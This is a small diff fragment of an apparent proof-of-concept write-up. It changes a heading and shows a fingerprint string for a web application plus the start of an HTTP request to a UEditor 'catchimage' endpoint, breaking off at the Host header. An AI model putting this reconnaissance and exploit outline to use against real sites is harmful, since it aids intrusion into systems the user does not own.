@@ -7,7 +7,7 @@
 body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
 ```
 
-## poc
+## POC
 ```javascript
 POST /Api/UEditor/UEditorAjaxApi.ashx?method=catchimage HTTP/1.1
 Host: 
